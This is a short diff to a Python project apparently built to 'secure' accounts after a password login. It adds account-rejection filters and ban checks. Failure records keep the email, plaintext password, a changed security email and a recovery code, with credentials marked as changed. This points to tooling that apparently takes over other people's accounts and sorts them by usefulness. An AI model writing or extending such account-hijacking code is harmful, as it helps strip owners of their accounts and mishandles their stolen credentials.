@@ -14,6 +14,7 @@ from securing.build_embeds import build_account_embeds, build_failure_embed
 from securing.auth.initial_session import get_session
 from securing.auth.account_status import get_account_lock_reason
 from securing.utils.secure import secure
+from securing.account_filters import rejection_reason
 from securing.utils.proxy import (
     close_session,
     is_proxy_transport_error,
@@ -177,6 +178,34 @@ async def _secure_after_password_login(
         account_info=account_info,
         command=True,
     )
+
+    reject = rejection_reason(secured)
+    if reject:
+        print(f"[X] - Rejected account: {reject}")
+        logging.warning("Rejected secured account %s: %s", email, reject)
+        return _failure_result(
+            email,
+            reject,
+            security_email=rextra.get("security_email"),
+            password=password,
+            recovery_code=rextra.get("recovery_code"),
+            credentials_changed=True,
+        )
+
+    from securing.ban_checks import apply_ban_checks
+
+    ban_reject = await apply_ban_checks(secured)
+    if ban_reject:
+        print(f"[X] - Banned account: {ban_reject}")
+        logging.warning("Ban-check rejected %s: %s", email, ban_reject)
+        return _failure_result(
+            email,
+            ban_reject,
+            security_email=rextra.get("security_email"),
+            password=password,
+            recovery_code=rextra.get("recovery_code"),
+            credentials_changed=True,
+        )
 
     account_id = uuid.uuid4().hex
     with DBConnection() as db:
